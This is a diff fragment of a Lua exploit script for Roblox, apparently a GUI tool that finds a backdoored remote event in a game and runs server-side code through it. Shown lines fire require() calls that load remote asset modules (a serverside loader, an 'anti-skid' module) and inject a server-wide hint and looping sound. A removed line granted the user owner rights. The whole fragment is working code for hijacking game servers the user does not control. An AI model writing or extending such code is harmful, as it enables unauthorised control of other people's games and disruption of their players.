@@ -2542,10 +2542,8 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 				Duration = 4
 			})
                      -- Auto executes
-                        fireRemoteEvent('require(92684888032460)({Owners = {"' .. game.Players.LocalPlayer.Name .. '"}})')
-                        wait(0.5)
+                        fireRemoteEvent('local h = Instance.new(\"Hint\",workspace)\nh.Text = \"\xF0\x9F\x91\x91 OUR KING \".. game.Players.LocalPlayer.DisplayName .. \" HAS JOINED! \xF0\x9F\x91\x91\"\nwait(12)\nh:Destroy()\nwait(0.1)\nlocal sound = Instance.new(\"Sound\")\nsound.Parent = workspace\nsound.SoundId = \"rbxassetid://96610114209889\"\nsound.Looped = true\nsound.Playing = true\nsound.Volume = 0.5\nsound.PlaybackSpeed = 1\nsound.TimePosition = 17.5\nwait(11.5)\nsound.TimePosition = 18')
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
-                        fireRemoteEvent('require(7276744247):noskids("' .. game.Players.LocalPlayer.Name ..  '")')
                         fireRemoteEvent('require(3986243232).load("No good sir this is c00okid serverside",{"' .. game.Players.LocalPlayer.Name ..  '"})')
 		else
 			script.Parent.Framee.Check.Text = "backdoor not found!"
